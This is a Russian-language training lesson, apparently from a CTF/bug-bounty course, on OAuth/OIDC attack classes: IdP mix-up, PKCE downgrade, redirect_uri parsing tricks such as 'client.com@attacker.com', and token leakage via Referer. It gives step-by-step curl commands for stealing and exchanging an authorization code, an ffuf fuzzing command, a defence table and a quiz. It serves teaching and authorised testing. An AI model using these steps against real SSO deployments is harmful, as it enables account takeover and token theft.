---
id: web-sso-mixup
title: "OAuth/SSO mix-up, PKCE downgrade и redirect_uri abuse"
category: web
parent: web-oauth-oidc-saml
difficulty: hard
order: 2
tags: [oauth, oidc, sso, mixup, pkce, redirect-uri]
prerequisites: [web-oauth-oidc-saml]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Классы SSO-багов за пределами redirect_uri: mix-up между IdP, downgrade PKCE, code injection, token leakage."
---

Когда в системе несколько OAuth/OIDC-провайдеров (или IdP + клиент), появляется класс багов **mix-up**: клиент путает, какому провайдеру он отправил запрос и от кого получил ответ. Атакующий подставляет свой IdP, перехватывает код и обменивает его. Плюс сюда примыкают downgrade PKCE, подмена `redirect_uri` через парсинг, `response_mode`-манипуляции и утечки токенов. Это «настоящие» SSO-баги, которые не ловятся простым перебором `redirect_uri`.

## Теория: что именно путается

**OAuth mix-up (CVE-2016-…, RFC draft).** Клиент поддерживает нескольких провайдеров. Он запоминает провайдера в сессии/куке, но при коллбэке **не проверяет**, что ответ пришёл именно от него. Атака:

1. Атакующий заставляет клиента начать flow с **своим** IdP (attacker IdP).
2. Клиент отправляет `client_id`/`redirect_uri` на attacker IdP.
3. Attacker IdP редиректит жертву на **настоящий** IdP (или наоборот) — и код/токен утекает атакующему.
4. Атакующий обменивает код на настоящем IdP, используя `redirect_uri`, который указал клиент.

Уязвимость — в отсутствии привязки ответа к провайдеру, с которого начался flow (`iss` не проверяется, `state` не привязан к IdP).

**PKCE downgrade.** Клиент умеет PKCE, но не требует его. Атакующий в MITM/перехвате выкидывает `code_challenge` — сервер (если PKCE не обязателен) выдаёт код без verifier, и его можно обменять.

**redirect_uri abuse (парсинг).** Даже со строгой проверкой возможны:
- `https://client.com@attacker.com` — если парсер берёт хост после `@`.
- `https://client.com.attacker.com`.
- `https://client.com/cb/../../attacker` — path traversal.
- Открытый редирект на `client.com`, уводящий код дальше.
- `redirect_uri` с фрагментом `#`, где клиент читает код из fragment.

## Разобранный пример: mix-up

Сетап: клиент `https://client.example` поддерживает `idp.legit` и позволяет добавить «свой» IdP (или имеет уязвимость подмены).

Шаг 1. Начинаем flow у клиента, но подсовываем `idp=attacker`. Клиент редиректит на `https://attacker-idp.example/authorize?client_id=...&redirect_uri=https://client.example/cb&state=...`.

Шаг 2. Attacker IdP **не** выдаёт свой код, а редиректит жертву на `https://idp.legit/authorize?...&redirect_uri=https://client.example/cb&state=...` — жертва логинится в настоящем IdP и получает **настоящий** `code` на `client.example/cb`.

Шаг 3. Клиент обрабатывает `code`, но при обмене на токен использует… **attacker IdP** (потому что запомнил его в начале flow). Код уходит атакующему.

Шаг 4. Атакующий обменивает украденный код на настоящем `idp.legit` (у него тот же `redirect_uri`), получает токен жертвы.

```bash
# attacker-idp -> 302 на legit с параметрами
https://idp.legit/authorize?response_type=code&client_id=CLIENT\
&redirect_uri=https://client.example/cb&scope=openid&state=STATE
```

## PKCE downgrade

```bash
# легитимный запрос
/authorize?response_type=code&client_id=X&redirect_uri=...&code_challenge=CH&code_challenge_method=S256
# атакуем: убираем code_challenge (если сервер не требует)
/authorize?response_type=code&client_id=X&redirect_uri=...
# получаем code без привязки к verifier, обмениваем
POST /token {grant_type:authorization_code, code:..., client_id:X}
```

Если сервер не отклоняет запрос без `code_challenge` для public-клиента — downgrade удался.

## Смежные векторы

- **`response_mode=form_post`** — код приходит POST'ом; иногда легче перехватить/залогировать.
- **`nonce` не проверяется** (OIDC) — replay ID-токена.
- **`state` не привязан** — CSRF на привязку аккаунта (login CSRF).
- **Token leakage via Referer** — токен в URL, утекает на внешние ресурсы.
- **`client_secret` в public-клиенте** — секрет в JS/мобильном приложении.
- **`id_token_hint`/`login_hint`** — подмена, утечка информации.
- **Open redirect на разрешённом домене** — обход строгого `redirect_uri`.
- **`response_type=token`** (implicit) — токен в fragment, перехват.

## Инструменты

- **Burp** с ручной правкой запросов; плагины OAuth.
- **`oauth-analyzer`** / собственные скрипты для перебора `redirect_uri`.
- **`ffuf`** по `redirect_uri`-паттернам и по списку разрешённых доменов.
- **Burp Collaborator** для OOB-проверки редиректов и утечек.

```bash
ffuf -u "https://idp.example/authorize?response_type=code&client_id=X&redirect_uri=FUZZ" \
     -w redirects.txt -mc 302 -fs 0
```

## Частые ошибки

- **Гоняться только за `redirect_uri`.** Mix-up и PKCE downgrade не в нём.
- **Не проверять `iss`.** Без валидации issuer mix-up не закрыть.
- **Игнорировать `state`/`nonce`.** Их отсутствие — отдельные баги (CSRF, replay).
- **Считать PKCE обязательным.** Он часто «поддерживается, но не требуется».
- **Забыть про парсер URL.** `@`, `#`, `\`, Unicode — обходят наивные проверки.
- **Путать OAuth (делегирование) и OIDC (аутентификация).** Разные баги.
- **Тестировать только один IdP.** Mix-up проявляется при нескольких.

## Полный разбор: mix-up атака пошагово (с выводом)

Сетап: клиент `https://client.example` поддерживает `idp.legit` и позволяет выбрать/добавить IdP.

Шаг 1. Начинаем flow у клиента, но с `idp=attacker` (в некоторых клиентах — параметр выбора, в других — через `iss`/метаданные):

```bash
# клиент редиректит на attacker-idp с client_id и redirect_uri
curl -sI "https://client.example/login?provider=attacker" | grep -i '^location'
# location: https://attacker-idp.example/authorize?client_id=CLIENT&redirect_uri=https://client.example/cb&state=S&response_type=code
```

Шаг 2. Attacker IdP **не** выдаёт свой код, а редиректит жертву на **настоящий** IdP с теми же параметрами:

```bash
# attacker-idp отвечает 302
# location: https://idp.legit/authorize?client_id=CLIENT&redirect_uri=https://client.example/cb&state=S&response_type=code&scope=openid
```

Шаг 3. Жертва логинится в настоящем IdP → код приходит на `client.example/cb`. Клиент, помня «attacker-idp» из шага 1, обменивает код **на attacker-idp**:

```bash
# на attacker-idp прилетает POST /token {code: настоящий_код}
# attacker получает код жертвы
```

Шаг 4. Атакующий обменивает украденный код на настоящем `idp.legit` (тот же `redirect_uri`), получая токен жертвы:

```bash
curl -s -X POST https://idp.legit/token \
  -d grant_type=authorization_code -d code=STOLEN -d redirect_uri=https://client.example/cb \
  -d client_id=CLIENT -d client_secret=...
# {"access_token":"...","id_token":"..."}
```

Шаг 5. Захват аккаунта. В отчёте — точные редиректы и точка, где клиент не проверяет `iss`/привязку IdP.

## Reference-таблица: SSO-векторы и защиты

| Вектор | Суть | Защита |
|--------|------|--------|
| mix-up | клиент путает IdP | валидация `iss`, привязка ответа к IdP |
| PKCE downgrade | выкидывание `code_challenge` | обязательный PKCE |
| redirect_uri abuse | парсинг/поддомены/`@` | строгое сравнение нормализованного URL |
| open redirect | увод кода через редирект | запрет редиректов на коллбэке |
| login CSRF | нет привязки `state` | проверка `state` |
| id_token replay | нет `nonce` | проверка `nonce` |
| token leakage (Referer) | токен в URL | `response_mode`, Referrer-Policy |
| client_secret в public | секрет в JS | не использовать секрет в public-клиенте |
| implicit flow | токен в fragment | использовать code+PKCE |

## PKCE downgrade и code injection

**PKCE downgrade:**

```bash
# легитимно
/authorize?...&code_challenge=CH&code_challenge_method=S256
# атака: убрать code_challenge
/authorize?...&response_type=code&client_id=X&redirect_uri=...
# сервер, не требующий PKCE, выдаёт код без привязки -> обмен без verifier
```

**Code injection:** если атакующий может подсунуть свой `code` в коллбэк жертвы (например, через `redirect_uri` или login CSRF), клиент обменяет **его** код и жертва войдёт в аккаунт атакующего (login CSRF), либо атакующий получит токен жертвы (в зависимости от направления).

Проверки: отправьте `/authorize` без `code_challenge` — если сервер не отклоняет (для public-клиента), downgrade возможен. Проверьте, привязывает ли клиент `state` к сессии.

## Что делать дальше / решение

1. **Перечислить IdP/провайдеров**, поддерживаемых клиентом.
2. **Проверить привязку ответа** к IdP (`iss`, `state`).
3. **Смоделировать mix-up** на своём стенде (attacker IdP).
4. **Проверить PKCE** (обязателен ли, можно ли выкинуть).
5. **Проверить `redirect_uri`** (парсинг, поддомены, `@`, редиректы).
6. **Проверить `state`/`nonce`** (CSRF/replay).
7. **Оформить PoC** на своём аккаунте, без атаки на чужой.

## response_mode, token leakage и инструменты

- **`response_mode=form_post`:** код/токен приходит POST'ом на коллбэк. Иногда легче перехватить (логи, referer-правила), иногда — сложнее.
- **`response_mode=fragment`:** токен в URL-фрагменте; утекает через историю/расширения/JS, читается только клиентом.
- **`response_mode=query`:** токен в query — утекает через `Referer` на внешние ресурсы, если коллбэк грузит аналитику/картинки. Проверьте: `Referrer-Policy: no-referrer` отсутствует?
- **Token leakage via Referer:** коллбэк с токеном в URL + внешний ресурс → токен в `Referer` третьей стороны.

```bash
curl -sI "https://client.example/cb?code=SECRET" | grep -i referrer-policy
# (пусто)  -> токен может утечь через Referer
```

**Инструменты:**

- **Burp** + ручная правка `redirect_uri`/`state`/`code_challenge`.
- **`ffuf`** по `redirect_uri`-паттернам.
- **Burp Collaborator** для OOB (утечки на attacker).
- **`oauth-analyzer`**/собственные скрипты для проверки привязок.

```bash
ffuf -u "https://idp.example/authorize?response_type=code&client_id=X&redirect_uri=FUZZ" \
     -w redirects.txt -mc 302 -fs 0
```

## Что делать дальше / решение

1. **Определить все IdP** и как клиент их различает.
2. **Проверить `iss`/`state`/`nonce`** (привязка ответа).
3. **Проверить PKCE** (обязателен ли).
4. **Перебрать `redirect_uri`** (парсинг, поддомены, `@`, редиректы).
5. **Проверить `response_mode`** и утечку токенов (Referer).
6. **Собрать PoC** на своём стенде.
7. **Оформить** цепочку «начало flow → подмена IdP → утечка кода → захват».

## Признаки уязвимости и приоритеты

**Признаки:** клиент поддерживает >1 IdP; `iss` не проверяется; `state`/`nonce` отсутствуют или не привязаны; PKCE не обязателен; `redirect_uri` валидируется подстрокой/поддоменами; коллбэк грузит внешние ресурсы (утечка токена).

**Приоритеты:** mix-up и PKCE downgrade — high/critical (захват аккаунта). Отсутствие `state` (login CSRF) — medium/high. Утечка токена через Referer — medium. `redirect_uri` abuse — high (если ведёт к краже кода). Всегда тестируйте на своих аккаунтах/своём IdP-стенде.

## Итог по mix-up

SSO-баги за пределами `redirect_uri` (mix-up, PKCE downgrade, утечка токенов) — это про **привязку ответа к провайдеру** и обязательность PKCE. Проверяйте `iss`, `state`, `nonce` и то, требует ли сервер `code_challenge`. Тестируйте на своём IdP-стенде.

## Квиз

```quiz
- question: "В чём суть OAuth mix-up?"
  options:
    - "Клиент путает провайдеров и отправляет код/токен не тому IdP"
    - "Подмена пароля"
    - "XSS в IdP"
    - "Отключение TLS"
  answer: 0
  explanation: "Ответ не привязан к провайдеру, начавшему flow."
- question: "Что проверяют для защиты от mix-up?"
  options:
    - "Цвет кнопки"
    - "iss (issuer) и привязку ответа к начатому flow"
    - "User-Agent"
    - "Cookie SameSite"
  answer: 1
  explanation: "Валидация issuer и state/привязки к IdP."
- question: "Что такое PKCE downgrade?"
  options:
    - "Отключение TLS"
    - "Выкидывание code_challenge, если сервер не требует PKCE"
    - "Подмена client_secret"
    - "Удаление nonce"
  answer: 1
  explanation: "Тогда перехваченный код обменивается без verifier."
- question: "Какой redirect_uri-трюк обходит наивную проверку хоста?"
  options:
    - "https://client.com@attacker.com"
    - "https://client.com/#/"
    - "https://client.com?a=b"
    - "https://client.com:443/"
  answer: 0
  explanation: "Парсер может взять хост после @ как реальный."
- question: "Чем опасен открытый редирект на разрешённом домене?"
  options:
    - "Он ускоряет flow"
    - "Через него можно увести authorization code на внешний хост"
    - "Он ломает state"
    - "Он включает PKCE"
  answer: 1
  explanation: "redirect_uri проходит allowlist, а редирект уводит код дальше."
```

## Где пригодится

- **CTF (Web):** задачи на SSO/OAuth с несколькими провайдерами.
- **Bug bounty:** mix-up и PKCE downgrade — высокооплачиваемые классы.
- **Пентест:** аудит интеграций SSO в корпоративных приложениях.
- **Работа (AppSec):** обязательный PKCE, валидация iss/nonce/state, строгий redirect_uri.
